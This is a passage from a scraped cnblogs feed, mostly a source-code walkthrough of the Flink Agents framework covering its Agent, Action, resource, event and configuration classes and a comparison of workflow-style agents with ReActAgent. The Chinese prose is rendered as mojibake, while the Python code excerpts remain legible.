<strong>è¯¸ä½ï¼æ°å¹´å¿«ä¹ï¼</strong></p>
<p><strong>é¢åï¼æä»¬é¢è®¡å¨2026.2.16ï¼é¤å¤ï¼åå¸Ctorch RC v1.0ï¼æ¬è¯·æå¾ï¼æ¬¢è¿èç³»ï¼QQ 1113109729ï¼åä¸åæµï¼ææ¿ä¸å°½ï¼</strong></p>
<p>GhostFace<br>
2025.12.31</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.029861111111111113" data-date-updated="2025-12-31 23:30">2025-12-31 22:47</span>&nbsp;
<a href="https://www.cnblogs.com/SilverGo">Ghost-Face</a>&nbsp;
éè¯»(<span id="post_view_count">68</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19428614);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19428614', targetLink: 'https://www.cnblogs.com/SilverGo/p/19428614', title: '2025å¹´åº¦æ»ç»' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãå¤§æ°æ® & AIãFlink Agents æºç è§£è¯» --- (3) --- Agent ]]></title>
    <link>https://www.cnblogs.com/rossiXYZ/p/19369869</link>
    <guid>c06644ce10a5d81e7560983016a38e45</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/rossiXYZ/p/19369869" title="åå¸äº 2025-12-31 19:17">
    <span role="heading" aria-level="2">ãå¤§æ°æ® &amp; AIãFlink Agents æºç è§£è¯» --- (3) --- Agent</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="å¤§æ°æ®--aiflink-agents-æºç è§£è¯»-----3------agent">ãå¤§æ°æ® &amp; AIãFlink Agents æºç è§£è¯» --- (3) ---  Agent</h1>
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#å¤§æ°æ®--aiflink-agents-æºç è§£è¯»-----3------agent" rel="noopener nofollow">ãå¤§æ°æ® &amp; AIãFlink Agents æºç è§£è¯» --- (3) ---  Agent</a><ul><li><a href="#0x00-æ¦è¦" rel="noopener nofollow">0x00 æ¦è¦</a></li><li><a href="#0x01-æ ¸å¿æ½è±¡" rel="noopener nofollow">0x01 æ ¸å¿æ½è±¡</a><ul><li><a href="#11-agentæ½è±¡" rel="noopener nofollow">1.1 Agentæ½è±¡</a></li><li><a href="#12-action-æ½è±¡" rel="noopener nofollow">1.2 Action æ½è±¡</a></li><li><a href="#13-èµæºæ½è±¡" rel="noopener nofollow">1.3 èµæºæ½è±¡</a></li><li><a href="#14-æ§è¡ç¯å¢æ½è±¡" rel="noopener nofollow">1.4 æ§è¡ç¯å¢æ½è±¡</a></li><li><a href="#15-äºä»¶æ½è±¡" rel="noopener nofollow">1.5 äºä»¶æ½è±¡</a></li><li><a href="#16-éç½®æ½è±¡" rel="noopener nofollow">1.6 éç½®æ½è±¡</a></li></ul></li><li><a href="#0x02-workflow-style-agent-åreactagent" rel="noopener nofollow">0x02 Workflow Style Agent åReActAgent</a><ul><li><a href="#21-ç¹æ§" rel="noopener nofollow">2.1 ç¹æ§</a><ul><li><a href="#211-è®¾è®¡çå¿µ" rel="noopener nofollow">2.1.1 è®¾è®¡çå¿µ</a></li><li><a href="#212-æ§å¶æµ" rel="noopener nofollow">2.1.2 æ§å¶æµ</a></li><li><a href="#213-å®å¶çº§å«" rel="noopener nofollow">2.1.3 å®å¶çº§å«</a></li><li><a href="#214-ä½¿ç¨åºæ¯" rel="noopener nofollow">2.1.4 ä½¿ç¨åºæ¯</a></li><li><a href="#215-å¼åå¤æåº¦" rel="noopener nofollow">2.1.5 å¼åå¤æåº¦</a></li><li><a href="#216-æ»ç»" rel="noopener nofollow">2.1.6 æ»ç»</a></li></ul></li><li><a href="#22-workflow" rel="noopener nofollow">2.2 workflow</a><ul><li><a href="#221-ä»£ç å¯¼è¯»" rel="noopener nofollow">2.2.1 ä»£ç å¯¼è¯»</a><ul><li><a href="#åå¤ä»£çæ§è¡ç¯å¢" rel="noopener nofollow">åå¤ä»£çæ§è¡ç¯å¢</a></li><li><a href="#åå»ºä»£ç" rel="noopener nofollow">åå»ºä»£ç</a></li><li><a href="#ä¸-flink-éæ" rel="noopener nofollow">ä¸ Flink éæ</a></li></ul></li></ul></li><li><a href="#23-react-agent" rel="noopener nofollow">2.3 ReAct Agent</a><ul><li><a href="#231-ä»£ç å¯¼è¯»" rel="noopener nofollow">2.3.1 ä»£ç å¯¼è¯»</a><ul><li><a href="#åå¤ä»£çæ§è¡ç¯å¢-1" rel="noopener nofollow">åå¤ä»£çæ§è¡ç¯å¢</a></li><li><a href="#åå»º-react-agent" rel="noopener nofollow">åå»º ReAct Agent</a></li><li><a href="#ä¸-flink-éæ-1" rel="noopener nofollow">ä¸ Flink éæ</a></li></ul></li></ul></li></ul></li><li><a href="#0x03-reactagent" rel="noopener nofollow">0x03 ReActAgent</a><ul><li><a href="#31-å®ä¹" rel="noopener nofollow">3.1 å®ä¹</a></li><li><a href="#32-æ·±åº¦å®å¶" rel="noopener nofollow">3.2 æ·±åº¦å®å¶</a><ul><li><a href="#321-reactagent-ç¹è²" rel="noopener nofollow">3.2.1 ReActAgent ç¹è²</a><ul><li><a href="#æµå¼å¤çéé" rel="noopener nofollow">æµå¼å¤çéé</a></li><li><a href="#ç¹å®çè¡ä¸ºæ¨¡å¼" rel="noopener nofollow">ç¹å®çè¡ä¸ºæ¨¡å¼</a></li><li><a href="#é®æ§ç¶ææ¯æ" rel="noopener nofollow">é®æ§ç¶ææ¯æ</a></li><li><a href="#llm-éæä¼å" rel="noopener nofollow">LLM éæä¼å</a></li><li><a href="#èµæºç®¡çæ¹å¼" rel="noopener nofollow">èµæºç®¡çæ¹å¼</a></li><li><a href="#ç±»åä¿¡æ¯å¤ç" rel="noopener nofollow">ç±»åä¿¡æ¯å¤ç</a></li><li><a href="#éè¯¯å¤çæºå¶" rel="noopener nofollow">éè¯¯å¤çæºå¶</a></li><li><a href="#ç»æåè¾åºæ¯æ" rel="noopener nofollow">ç»æåè¾åºæ¯æ</a></li><li><a href="#æç¤ºè¯æ¨¡æ¿ç³»ç»" rel="noopener nofollow">æç¤ºè¯æ¨¡æ¿ç³»ç»</a></li><li><a href="#å·¥å·è°ç¨éæ" rel="noopener nofollow">å·¥å·è°ç¨éæ</a></li><li><a href="#è¿è¡æ¶åä½" rel="noopener nofollow">è¿è¡æ¶åä½</a></li></ul></li></ul></li><li><a href="#33-å¸åæ§è¡æµç¨" rel="noopener nofollow">3.3 å¸åæ§è¡æµç¨</a></li><li><a href="#34-start_action-ä¸-stop_action" rel="noopener nofollow">3.4 start_action ä¸ stop_action</a></li><li><a href="#35-è¾å¥è¾åº" rel="noopener nofollow">3.5 è¾å¥è¾åº</a><ul><li><a href="#351-äºä»¶é©±å¨æ¶æ" rel="noopener nofollow">3.5.1 äºä»¶é©±å¨æ¶æ</a></li><li><a href="#352-ç»ä¸çæ°æ®å°è£" rel="noopener nofollow">3.5.2 ç»ä¸çæ°æ®å°è£</a></li><li><a href="#353-æ¯æå¤ç§æ°æ®ç±»å" rel="noopener nofollow">3.5.3 æ¯æå¤ç§æ°æ®ç±»å</a></li><li><a href="#354-åç½®æ¨¡æ¿æ¯æ" rel="noopener nofollow">3.5.4 åç½®æ¨¡æ¿æ¯æ</a></li></ul></li><li><a href="#36-æ¨¡æ¿ç³»ç»" rel="noopener nofollow">3.6 æ¨¡æ¿ç³»ç»</a><ul><li><a href="#361-å­ç¬¦ä¸²æ¨¡æ¿" rel="noopener nofollow">3.6.1 å­ç¬¦ä¸²æ¨¡æ¿</a></li><li><a href="#362-æ¶æ¯æ¨¡æ¿" rel="noopener nofollow">3.6.2 æ¶æ¯æ¨¡æ¿</a></li></ul></li><li><a href="#37-functiontool-ä¸-action-çå³èåæ³¨åæºå¶" rel="noopener nofollow">3.7 FunctionTool ä¸ Action çå³èåæ³¨åæºå¶</a><ul><li><a href="#371-å®éè½¬æ¢æµç¨" rel="noopener nofollow">3.7.1 å®éè½¬æ¢æµç¨</a><ul><li><a href="#function-tool-æ³¨åå°-agent" rel="noopener nofollow">Function Tool æ³¨åå° Agent</a></li><li><a href="#ä¸æ¨¡åäº¤äº" rel="noopener nofollow">ä¸æ¨¡åäº¤äº</a></li></ul></li><li><a href="#372-agentplan-ç¼è¯è¿ç¨ä¸­å·¥å·çå¤ç" rel="noopener nofollow">3.7.2 AgentPlan ç¼è¯è¿ç¨ä¸­å·¥å·çå¤ç</a><ul><li><a href="#ç¨æ·å®ä¹ç-function-tool-è½¬æ¢ä¸º-action" rel="noopener nofollow">ç¨æ·å®ä¹ç Function Tool è½¬æ¢ä¸º Action</a></li><li><a href="#åç½®-tool-call-action" rel="noopener nofollow">åç½® Tool Call Action</a></li><li><a href="#tool_call_action-å¦ä½ç¼è¯å°agentplan" rel="noopener nofollow">TOOL_CALL_ACTION å¦ä½ç¼è¯å°AgentPlan</a></li></ul></li><li><a href="#373-å·¥å·è°ç¨æµç¨" rel="noopener nofollow">3.7.3 å·¥å·è°ç¨æµç¨</a></li><li><a href="#374-å®æ´æµç¨å¾" rel="noopener nofollow">3.7.4 å®æ´æµç¨å¾</a></li><li><a href="#375-ä»£ç " rel="noopener nofollow">3.7.5 ä»£ç </a></li></ul></li></ul></li><li><a href="#0xff-åè" rel="noopener nofollow">0xFF åè</a></li></ul></li></ul></div><p></p>
<h2 id="0x00-æ¦è¦">0x00 æ¦è¦</h2>
<p>Agentæ¯ Flink Agent æ¡æ¶çæ ¸å¿æ¦å¿µï¼å®æ¯ä¸ä¸ªå¯æ§è¡ååï¼ç¨äºå¤çè¾å¥äºä»¶å¹¶çæè¾åºäºä»¶ãä¸»è¦åè½åç¹è²å¦ä¸ï¼</p>
<ul>
<li>äºä»¶é©±å¨å¤çï¼åºäºäºä»¶é©±å¨æ¶æï¼ååºä¸åç±»åçäºä»¶ï¼å¦ InputEventï¼ChatRequestEventç­ï¼ï¼éè¿å®ä¹actionsæ¥å¤çç¹å®äºä»¶ç±»åã</li>
<li>èµæºç®¡çï¼ç®¡çåç§èµæºï¼å¦èå¤©æ¨¡åãå·¥å·ãæç¤ºè¯ç­ãæ¯æå¤ç§èµæºç±»åï¼CHAT_MOEL, TOOL, PROMPTç­ï¼ã</li>
<li>å¯æ©å±æ§ï¼æ¯æèªå®ä¹çactionsåèµæºï¼å¯ä»¥éè¿ç»§æ¿Agentç±»æ¥åå»ºç¹å®åè½çAgentï¼å¦ReActAgentã</li>
<li>éç½®æ¯æï¼æ¯æéè¿éç½®éé¡¹èªå®ä¹è¡ä¸ºï¼æä¾ç»ä¸çéç½®ç®¡çæºå¶ã</li>
<li>æ¨¡ååè®¾è®¡ï¼å°åè½åè§£ä¸ºç¬ç«çActionsï¼æ¯ä¸ªactionè´è´£å¤çç¹å®ç±»åçäºä»¶ã</li>
<li>èµæºæ½è±¡ï¼éè¿ ResourceDescriptor æ½è±¡èµæºå®ä¹ï¼æ¯æä¸åç±»åçèµæºï¼æ¨¡åï¼å·¥å·ï¼æç¤ºè¯ç­ï¼</li>
<li>ç¶æç®¡çï¼æä¾ç­æåå­ç®¡çæºå¶ï¼æ¯æåºäºkeyçç¶æéç¦»ã</li>
<li>å¤ç¯å¢æ¯æï¼æ¯ææ¬å°æ§è¡ç¯å¢ç¨äºè°è¯ï¼æ¯æè¿ç¨ Flink ç¯å¢ç¨äºçäº§ã</li>
</ul>
<h2 id="0x01-æ ¸å¿æ½è±¡">0x01 æ ¸å¿æ½è±¡</h2>
<h3 id="11-agentæ½è±¡">1.1 Agentæ½è±¡</h3>
<p>Agent ä½ä¸ºåºç±»æä¾äºï¼</p>
<ul>
<li>èµæºç®¡çï¼resources å­å¸ï¼ã</li>
<li>Action æ³¨åæºå¶ï¼actions å­å¸ï¼ã</li>
<li>ç»ä¸çæ¥å£ä¾æ§è¡ç¯å¢ä½¿ç¨ã</li>
</ul>
<pre><code class="language-python">class Agent(ABC):
    """Base class for defining agent logic.

    Example:
        Users have two ways to create an Agent

        * Declare an Agent with decorators
        ::

            class MyAgent(Agent):
                @action(InputEvent)
                @staticmethod
                def my_action(event: Event, ctx: RunnerContext) -&gt; None:
                    action logic

                @chat_model_connection
                @staticmethod
                def my_connection() -&gt; ResourceDescriptor:
                    return ResourceDescriptor(clazz=OllamaChatModelConnection,
                                              model="qwen2:7b",
                                              base_url="http://localhost:11434")

                @chat_model_setup
                @staticmethod
                def my_chat_model() -&gt; ResourceDescriptor:
                    return ResourceDescriptor(clazz=OllamaChatModel,
                                              connection="my_connection")

        * Add actions and resources to an Agent instance
        ::

            my_agent = Agent()
            my_agent.add_action(name="my_action",
                                events=[InputEvent],
                                func=action_function)
                    .add_resource(name="my_connection",
                                  instance=ResourceDescriptor(
                                        clazz=OllamaChatModelConnection,
                                        arg1=xxx
                                )
                    .add_resource(
                        name="my_connection",
                        instance=ResourceDescriptor(
                            clazz=OllamaChatModelConnection,
                            arg1=xxx
                        )
                    )
                    .add_resource(
                        name="my_chat_model",
                        instance=ResourceDescriptor(
                            clazz=OllamaChatModelSetup,
                            connection="my_connection"
                        )
                    )
    """

    _actions: Dict[str, Tuple[List[Type[Event]], Callable, Dict[str, Any]]]
    _resources: Dict[ResourceType, Dict[str, Any]]
    _mcp_servers: Dict[str, MCPServer]

    def __init__(self) -&gt; None:
        """Init method."""
        self._actions = {}
        self._resources = {}
        for type in ResourceType:
            self._resources[type] = {}

    @property
    def actions(self) -&gt; Dict[str, Tuple[List[Type[Event]], Callable, Dict[str, Any]]]:
        """Get added actions."""
        return self._actions

    @property
    def resources(self) -&gt; Dict[ResourceType, Dict[str, Any]]:
        """Get added resources."""
        return self._resources

    def add_action(
        self, name: str, events: List[Type[Event]], func: Callable, **config: Any
    ) -&gt; "Agent":
        """Add action to agent.

        Parameters
        ----------
        name : str
            The name of the action, should be unique in the same Agent.
        events: List[Type[Event]]
            The type of events listened by this action.
        func: Callable
            The function to be executed when receive listened events.
        **config: Any
            Key named arguments can be used by this action in runtime.

        Returns:
        -------
        Agent
            The modified Agent instance.
        """
        if name in self._actions:
            msg = f"Action {name} already defined"
            raise ValueError(msg)
        self._actions[name] = (events, func, config if config else None)
        return self

    def add_resource(
        self, name: str, instance: SerializableResource | ResourceDescriptor
    ) -&gt; "Agent":
        """Add resource to agent instance.

        Parameters
        ----------
        name : str
            The name of the prompt, should be unique in the same Agent.
        instance: SerializableResource | ResourceDescriptor
            The serializable resource instance, or the descriptor of resource.

        Returns:
        -------
        Agent
            The agent to add the resource.
        """
        if isinstance(instance, SerializableResource):
            resource_type = instance.resource_type()
        elif isinstance(instance, ResourceDescriptor):
            resource_type = instance.clazz.resource_type()
        else:
            err_msg = f"Unexpected resource {instance}"
            raise TypeError(err_msg)

        if name in self._resources[resource_type]:
            msg = f"{resource_type.value} {name} already defined"
            raise ValueError(msg)

        self._resources[resource_type][name] = instance
        return self
</code></pre>
<h3 id="12-action-æ½è±¡">1.2 Action æ½è±¡</h3>
<p>Action æä¾äºï¼</p>
<ul>
<li>äºä»¶çå¬æºå¶</li>
<li>ä¸æ§è¡ä¸ä¸æçäº¤äºæ¥å£</li>
<li>ç»ä¸çæ§è¡æ¥å£</li>
</ul>
<p>éè¿è£é¥°å¨æèadd_actionæ¹æ³å®ä¹ã</p>
<pre><code class="language-python">    @action(InputEvent)
    @staticmethod
    def start_action(event: InputEvent, ctx: RunnerContext) -&gt; None:
        """Start action to format user input and send chat request event."""
        usr_input = event.input
</code></pre>
<h3 id="13-èµæºæ½è±¡">1.3 èµæºæ½è±¡</h3>
<p>èµæºæ½è±¡åæ¬ï¼æ¨¡åè¿æ¥ï¼CHAT_MODEL_CONNECTION)ï¼å·¥å·ï¼æç¤ºè¯ï¼MCPæå¡å¨ç­ã</p>
<pre><code class="language-python">class ResourceDescriptor:
    """Descriptor of resource, includes the class and the initialize arguments."""

    _clazz: Type[Resource]
    _arguments: Dict[str, Any]

    def __init__(self, *, clazz: Type[Resource], **arguments: Any) -&gt; None:
        """Init method."""
        self._clazz = clazz
        self._arguments = arguments

    @property
    def clazz(self) -&gt; Type[Resource]:
        """Get the class of the resource."""
        return self._clazz

    @property
    def arguments(self) -&gt; Dict[str, Any]:
        """Get the initialize arguments of the resource."""
        return self._arguments
</code></pre>
<h3 id="14-æ§è¡ç¯å¢æ½è±¡">1.4 æ§è¡ç¯å¢æ½è±¡</h3>
<p>æ§è¡ä¸ä¸ææä¾ï¼</p>
<ul>
<li>äºä»¶åéæºå¶</li>
<li>èµæºè®¿é®æ¥å£</li>
<li>åå­ç®¡ç</li>
<li>éç½®è®¿é®</li>
</ul>
<pre><code class="language-python">class RunnerContext(ABC):
    """Abstract base class providing context for agent execution.

    This context provides access to event handling.
</code></pre>
<h3 id="15-äºä»¶æ½è±¡">1.5 äºä»¶æ½è±¡</h3>
<p>å³ Event ä½ç³»ï¼æä¾äºï¼</p>
<ul>
<li>ç»ä¸çäºä»¶å¤çæºå¶</li>
<li>ç±»åå®å¨çäºä»¶åå</li>
<li>å¯æ©å±çäºä»¶ç±»åç³»ç»</li>
</ul>
<pre><code class="language-python">class Event(BaseModel, ABC, extra="allow"):
    """Base class for all event types in the system. Event allow extra properties, but
    these properties are required isinstance of BaseModel, or json serializable.

    Attributes:
    ----------
    id : UUID
        Unique identifier for the event, automatically generated using uuid4.
    """

    id: UUID = Field(default_factory=uuid4)
</code></pre>
<h3 id="16-éç½®æ½è±¡">1.6 éç½®æ½è±¡</h3>
<p>AgentConfiguration æä¾äºï¼</p>
<ul>
<li>ç±»åå®å¨çéç½®éé¡¹</li>
<li>é»è®¤å¼ç®¡ç</li>
<li>ä»æä»¶å è½½éç½®çè½å</li>
</ul>
<pre><code class="language-python">class AgentConfiguration(BaseModel, Configuration):
    """Base class for config objects in the system.
    Provides a flat dict interface to access nested config values.
    """

    conf_data: Dict[str, Any]

    def __init__(self, conf_data: Dict[str, Any] | None = None) -&gt; None:
        """Initialize with optional configuration data."""
        if conf_data is None:
            super().__init__(conf_data = {})
        else:
            super().__init__(conf_data = conf_data)

</code></pre>
<h2 id="0x02-workflow-style-agent-åreactagent">0x02 Workflow Style Agent åReActAgent</h2>
<p>æä¸¤ç§ææ®éçAgentsï¼</p>
<ul>
<li><strong>Workflows</strong> æ¯ç±é¢å®ä¹çä»£ç è·¯å¾æ¥ç¼æ LLM åå·¥å·çç³»ç»ã</li>
<li><strong>Agents</strong> åæ¯ LLM å¨ææå¯¼èªèº«æµç¨åå·¥å·ä½¿ç¨çç³»ç»ï¼å®ä»¬ææ§çèªå·±å®æä»»å¡çæ¹å¼ã</li>
</ul>
<p>å½éè¦å¤çæ´å¤æä»»å¡æ¶ï¼Workflows ä¸ºå®ä¹æç¡®çä»»å¡æä¾äºå¯é¢æµæ§åä¸è´æ§ï¼å¤ç°ï¼ï¼èå½éè¦å¤§è§æ¨¡ççµæ´»æ§åæ¨¡åé©±å¨çå³ç­æ¶ï¼agents åæ¯æ´å¥½çéæ©ã</p>
<p>å¯¹åºè¿ä¸¤ç§Agentï¼Flink Agents æä¸¤ç§ä¸åçAgentï¼Workflow Style Agent åReActAgentã</p>
<ul>
<li>å¨ Flink-Agents ä¸­ï¼å·¥ä½æµé£æ ¼çä»£çï¼workflow-style agentï¼ææ¨çä¸è¡ä¸ºç»ç»æä¸æ¡ç±âå¨ä½ï¼actionï¼âææçæåå·¥ä½æµï¼å¨ä½ä¹é´éè¿äºä»¶è¿æ¥ãè¿ç§è®¾è®¡åé´äºå¤æå¤é¶æ®µä»»å¡çç¼æéæ±ï¼å¸æä»¥éæãå¯æ©å±ä¸ä»¥æ°æ®ä¸ºä¸­å¿çæ¹å¼å©ç¨ Apache Flink çæµå¼æ¶ææ¥å®æå·¥ä½ãWorkflow éåä»»å¡æ¯å¯ä»¥è¢«æ¸é¤çè§£ææåºå®çå­ä»»å¡ååãWorkflow ç¸å¯¹äº Agent æä¸ªå¤©ç¶çä¼å¿å°±æ¯é«æçï¼ä¸ææéå¸¸ç¨³å®ï¼æ§è¡åºæ¬é½è½å¨é¢æèå´åï¼ä¸å¯é¢ç¥æèè¯´æªç¥æ§å¾ä½ãç¼ºç¹èªç¶å°±æ¯ä¸å¤çµæ´»äºï¼é¢å¯¹ä¸äºå¼æ¾çæèæ æ³é¢å®ä¹çä»»å¡å°±æ æ³å¤çäºã</li>
<li>ReActï¼Reasoning and Actingï¼Agent æ¯ä¸ç§éç¨èå¼ï¼ææ¨çä¸è¡å¨è½åç»åèµ·æ¥è§£å³å¤æä»»å¡ãåå©è¯¥èå¼ï¼ç¨æ·åªéå¨æç¤ºè¯éæå®ç®æ å¹¶æä¾å¯ç¨å·¥å·ï¼å¤§æ¨¡åä¾¿ä¼èªä¸»å³å®å¦ä½è¾¾æç®æ å¹¶æ§è¡ç¸åºå¨ä½ãReActéè¿æ¨¡æäººç±»çâReasoning-Actingâæ¨¡å¼ï¼ä½¿LLMè½å¤å¨æå°å³å®æ°æ®éæ± ãå¶æ ¸å¿æ¯ä¸ä¸ªå¾ªç¯ï¼æèï¼Thoughtï¼ï¼ LLMé¦åè¿è¡åé¨æ¨çãå®åæå½åä»»å¡åå·²æä¿¡æ¯ï¼å¤æ­æ¯å¦ç¼ºå°å®æä»»å¡æéçç¥è¯ï¼å¹¶å¶å®ä¸ä¸æ­¥çè¡å¨è®¡åãå¨è¿ä¸ªå¾ªç¯ä¸­ï¼æ°æ®æµæ¯æ ¹æ®LLMçâæèâç»æå¨æçæçãå½LLMå¤æ­éè¦å¤é¨æ°æ®æ¶ï¼å®ä¼ä¸»å¨è§¦åä¸ä¸ªâè¡å¨âæ¥è·åæ°æ®ï¼ç¶åå°è·åå°çâè§å¯âæ°æ®æ´åè¿èªå·±çä¸ä¸æä¸­ï¼ç¨äºä¸ä¸æ­¥çå³ç­ã</li>
</ul>
<h3 id="21-ç¹æ§">2.1 ç¹æ§</h3>
<p>ä¸¤ç§Agentçè¯¦ç»æ¢³çå¦ä¸ï¼</p>
<h4 id="211-è®¾è®¡çå¿µ">2.1.1 è®¾è®¡çå¿µ</h4>
<p>Workflow Style Agent</p>
<ul>
<li>å¯å®å¶æ¡æ¶ï¼çµæ´»çæ¡æ¶ï¼åè®¸ç¨æ·å®ä¹èªå·±çä»£çé»è¾</li>
<li>äºä»¶é©±å¨æ¶æï¼é»è¾è¢«ç»ç»ä¸ºç±äºä»¶è¿æ¥çå¨ä½æåå¾</li>
<li>æ¨¡ååè®¾è®¡ï¼ç¨æ·éè¿å®ä¹åä¸ªå¨ä½åå¶äº¤äºæ¥ç»åä»£ç</li>
</ul>
<p>ReActAgent</p>
<ul>
<li>é¢æå»ºä»£çï¼åºäº ReActï¼æ¨ç+è¡å¨ï¼èå¼çåç½®ãå³ç¨åä»£çå®ç°</li>
<li>ä»¥ LLM ä¸ºä¸­å¿ï¼ä¸é¨ä¸º LLM ååºéåä½ç§è¡å¨çå³ç­èè®¾è®¡</li>
<li>æ ååå·¥ä½æµï¼éµå¾ªåºå®çâæç»´âè¡å¨âè§å¯âå¾ªç¯æ¨¡å¼</li>
</ul>
<h4 id="212-æ§å¶æµ">2.1.2 æ§å¶æµ</h4>
<p>Workflow Style Agent</p>
<ul>
<li>æ¾å¼æµç¨ï¼ç¨æ·æç¡®å®ä¹äºä»¶å¦ä½è§¦åå¨ä½</li>
<li>äºä»¶è·¯ç±ï¼å¨ä½ç±ç¹å®çäºä»¶ç±»åè§¦å</li>
<li>çµæ´»æ¨¡å¼ï¼å¯ä»¥å®ç°åç§æ¨¡å¼ï¼å¦é¡ºåºãåæ¯æå¾ªç¯å·¥ä½æµ</li>
</ul>
<p>ReActAgent</p>
<ul>
<li>éå¼æµç¨ï¼å³ç­è¿ç¨å¨åé¨ç± LLM å¤ç</li>
<li>å·¥å·è°ç¨ï¼ä½¿ç¨ LLM çåçå½æ°è°ç¨åè½æ¥ç¡®å®æä½</li>
<li>åºå®æ¨¡å¼ï¼éµå¾ªæ åç ReAct æ¨¡å¼ï¼æèâè¡å¨âè§å¯ï¼</li>
</ul>
<h4 id="213-å®å¶çº§å«">2.1.3 å®å¶çº§å«</h4>
<p>Workflow Style Agent</p>
<ul>
<li>é«åº¦å¯å®å¶ï¼å¯¹ä»£çé»è¾ãå¨ä½åäºä»¶æµæ¥æå®å¨æ§å¶æ</li>
<li>èªå®ä¹å¨ä½ï¼ç¨æ·å®ä¹ææå¨ä½åå¶è¡ä¸º</li>
<li>çµæ´»äºä»¶ï¼ç¨æ·å¯ä»¥å®ä¹èªå®ä¹äºä»¶ç±»ååå¤çé»è¾</li>
</ul>
<p>ReActAgent</p>
<ul>
<li>æéå®å¶ï¼å®å¶ä¸»è¦éè¿æç¤ºè¯ãæ¨¡ååè¾åºæ¨¡å¼å®ç°</li>
<li>é¢å®ä¹å¨ä½ï¼ä½¿ç¨åç½®å¨ä½å¦ start_action å stop_action</li>
<li>æ åæ¥å£ï¼ä¸ºç±»ä¼¼ç LLM ä»»å¡æä¾ä¸è´çæ¥å£</li>
</ul>
<h4 id="214-ä½¿ç¨åºæ¯">2.1.4 ä½¿ç¨åºæ¯</h4>
<p>Workflow Style Agent</p>
<ul>
<li>å·æåºå®åºåææ¡ä»¶åæ¯çå¤æ­¥éª¤æµç¨</li>
<li>éè¦ç²¾ç¡®æ§å¶ä»£çè¡ä¸ºçåºæ¯</li>
<li>å¨é¢å®é¡ºåºä¸­ä¸å¤ä¸ªå¤é¨ç³»ç»éæ</li>
</ul>
<p>ReActAgent</p>
<ul>
<li>éè¦ LLM æ¨çä½¿ç¨åªäºå·¥å·/æä½çä»»å¡</li>
<li>å¸¦å·¥å·ä½¿ç¨çæ åé®ç­</li>
<li>LLM åºè¯¥å¨æå³å®å·¥ä½æµç¨çåºæ¯</li>
</ul>
<p>åªè¦âé®é¢ä¸å¯å®å¨ç©·ä¸¾ãè¦è·¨å¤ç³»ç»æ¥è¯ãå¹¶ä¸éè¦å¨å¯¹è¯ä¸­æ¾æ¸/åå/å³ç­âï¼å°±æ´åºè¯¥ç¨ReActAgentï¼èä¸æ¯çº¯ Workflowã</p>
<h4 id="215-å¼åå¤æåº¦">2.1.5 å¼åå¤æåº¦</h4>
<p>Workflow Style Agent</p>
<ul>
<li>æ´é«çµæ´»æ§ï¼éè¦æ´å¤ä»£ç ä½æ§å¶åæ´å¼º</li>
<li>èªå®ä¹é»è¾ï¼éè¦å®ç°ææå¨ä½é»è¾</li>
<li>æ ä¸»è§ï¼å¼åäººåæ§å¶ä»£çè¡ä¸ºçæææ¹é¢</li>
</ul>
<p>ReActAgent</p>
<ul>
<li>è¾ä½é¨æ§ï¼æ´å®¹æä¸æï¼å·æé¢å®ä¹åè½</li>
<li>ä»£ç éå°ï¼è®¾ç½®æéçä»£ç æå°</li>
<li>æä¸»è§ï¼ä»£è¡¨å¼åäººåååºè®¸å¤å³ç­</li>
</ul>
<h4 id="216-æ»ç»">2.1.6 æ»ç»</h4>
<p>ReActAgent ä¸ºæ åçåºäº LLM çæ¨çä»»å¡æä¾äºç°æçè§£å³æ¹æ¡ï¼è Workflow Style Agent ä¸ºå¤æçèªå®ä¹ä»£çå®ç°æä¾äºæå¤§ççµæ´»æ§ã</p>
<p>æäººæç§°ï¼ææèµç¨ Agent è®²æäºï¼åä¸å¡è¸è¸å®å®ç¨ Workflow ãè¿å¥ç©ç¬èåæå°åºç°å®çèéï¼Workflow èå¨ç¡®å®æ§ï¼è Agent èå¨ä¸éã</p>
<h3 id="22-workflow">2.2 workflow</h3>
<p>å®æ¹çå¿«éå¥é¨ï¼docs\content\docs\get-started\quickstart\workflow_agent.mdï¼éè¿ä¸¤ä¸ªæ¸è¿å¼æµå¼ç¤ºä¾ï¼å±ç¤ºå¦ä½ç¨ Flink Agents æå»ºç±å¤§æ¨¡åé©±å¨çæµæ°´çº¿ï¼</p>
<ul>
<li><strong>è¯è®ºåæ</strong>ï¼ç¤ºä¾ä¸ ä¼æç»­æ¥æ¶ååè¯è®ºæµï¼å¹¶ç¨åä¸ªä»£çä»æ¯æ¡è¯è®ºä¸­æåè¯åï¼1-5ï¼ä»¥åä¸æ»¡æåå ã</li>
<li><strong>äº§åæ¹è¿å»ºè®®</strong>ï¼å¨ç¤ºä¾ä¸çåºç¡ä¸ï¼æçªå£èåæ¯æ¡è¯è®ºçåæç»æï¼çæååçº§å«çæ±æ»ï¼è¯ååå¸ãå¸¸è§æ±æ¨ï¼ï¼åè°ç¨ç¬¬äºä¸ªä»£çä¸ºæ¯ä»¶ååè¾åºå·ä½çæ¹è¿å»ºè®®ã</li>
</ul>
<p>ä¸¤ä¸ªç¤ºä¾åå¨ä¸èµ·ï¼æ¼ç¤ºäºå¦ä½ç¨ Flink Agents æå»ºå¤ä»£çå·¥ä½æµï¼å¹¶ç´æ¥å¨ Flink ç¬ç«éç¾¤ä¸è¿è¡ã</p>
<h4 id="221-ä»£ç å¯¼è¯»">2.2.1 ä»£ç å¯¼è¯»</h4>
<h5 id="åå¤ä»£çæ§è¡ç¯å¢">åå¤ä»£çæ§è¡ç¯å¢</h5>
<p>åå»º Agents æ§è¡ç¯å¢ï¼æ³¨åå¯ä¾ä»£çä½¿ç¨çèå¤©æ¨¡åè¿æ¥ã</p>
<pre><code class="language-Java">// Set up the Flink streaming environment and the Agents execution environment.
StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
